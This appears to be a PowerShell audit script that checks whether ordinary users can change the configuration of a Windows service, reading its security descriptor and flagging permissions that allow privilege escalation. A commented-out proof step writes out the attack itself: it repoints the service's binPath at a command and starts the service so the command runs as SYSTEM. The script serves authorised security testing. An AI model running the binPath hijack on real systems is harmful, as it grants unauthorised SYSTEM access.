# service-abuse probe — can a standard user reconfigure TargetSvc?
# READ-ONLY by default. The write test is commented out: uncomment ONLY in your own VM and
# ONLY if scope/authorized_actions.txt grants `modify-acl`.
$svc = "TargetSvc"
Write-Host "running as: $(whoami)"
$sd = (& sc.exe sdshow $svc) -join ' '
Write-Host "SDDL: $sd"
# Decode the ACEs that matter:
#   RP = start,  WP = stop,  DC = CHANGE CONFIG (this is the LPE),  WD/GA = full
#   ;;;BU = Builtin\Users   ;;;AU = Authenticated Users   ;;;IU = Interactive   ;;;WD = Everyone
if ($sd -match 'A;;[^)]*DC[^)]*;;;(BU|AU|IU|WD|S-1-5-32-545)') {
  Write-Host "*** Users can CHANGE THE SERVICE CONFIG — set binPath and restart = SYSTEM" -ForegroundColor Red
}
if ($sd -match 'A;;[^)]*(WD|GA)[^)]*;;;(BU|AU|IU|WD)') {
  Write-Host "*** Users have WRITE_DAC/GENERIC_ALL on the service" -ForegroundColor Red
}
Get-CimInstance Win32_Service -Filter "Name='$svc'" |
  Select-Object Name, StartName, PathName, StartMode, State | Format-List

# Proof step (ACTIVE — your own VM only):
# sc.exe config $svc binPath= "cmd /c echo %username% > C:\Users\Public\wh_svc.txt"
# sc.exe start  $svc
# ... then RESTORE the original binPath immediately.
